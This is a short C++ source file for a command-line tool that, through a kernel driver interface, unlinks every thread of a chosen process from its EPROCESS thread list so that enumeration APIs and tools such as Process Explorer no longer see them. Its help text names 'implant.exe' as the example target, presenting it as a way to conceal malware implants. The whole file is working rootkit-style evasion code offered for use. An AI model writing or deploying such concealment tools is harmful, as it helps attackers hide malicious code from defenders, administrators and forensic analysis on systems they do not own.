#include <print>
#include <memory>
#include <string>
#include <string_view>
#include "../Memory/DriverInterface/driver_interface.hpp"

static std::wstring to_wide( std::string_view s )
{
	return { s.begin(), s.end() };
}

static void print_help( std::string_view prog )
{
	std::print( R"({0} - Hide all threads of a process from enumeration.

Description:
  Unlinks all threads from the process's ThreadListHead in the
  EPROCESS structure. After calling this, thread enumeration APIs
  (NtQuerySystemInformation, Process Explorer, etc.) will no longer
  see the threads. The threads continue to execute normally.

Usage:
  {0} <process_name>     Hide threads by process name
  {0} --pid <pid>        Hide threads by process ID
  {0} --help             Show this help

Arguments:
  process_name    Name of the target process (e.g. implant.exe)
  --pid <pid>     Process ID (decimal)

Examples:
  {0} implant.exe
  {0} --pid 4200
)", prog );
}

int main( int argc, char* argv[] )
{
	if( argc < 2 || std::string_view{ argv[1] } == "--help" || std::string_view{ argv[1] } == "-h" )
	{
		print_help( argv[0] );
		return ( argc > 1 && ( std::string_view{ argv[1] } == "--help" || std::string_view{ argv[1] } == "-h" ) ) ? 0 : 1;
	}

	const auto arg1 = std::string_view{ argv[1] };
	const auto driver = std::make_unique< driver_interface >();

	if( !driver->is_connected() )
	{
		std::println( "[!] Could not connect to the driver!" );
		return 1;
	}

	if( arg1 == "--pid" )
	{
		if( argc < 3 )
		{
			std::println( "[!] --pid requires a process ID argument." );
			return 1;
		}

		driver->attach( static_cast< DWORD >( std::stoul( argv[2] ) ) );
	}
	else
	{
		if( !driver->attach( to_wide( arg1 ) ) )
		{
			std::println( "[!] Could not find process '{}'!", arg1 );
			return 1;
		}
	}

	std::println( "[+] Target PID: {}", driver->get_pid() );

	if( auto hidden = driver->hide_threads() )
		std::println( "[+] Hidden {} threads from enumeration.", *hidden );
	else
	{
		std::println( "[!] Failed to hide threads." );
		return 1;
	}

	return 0;
}
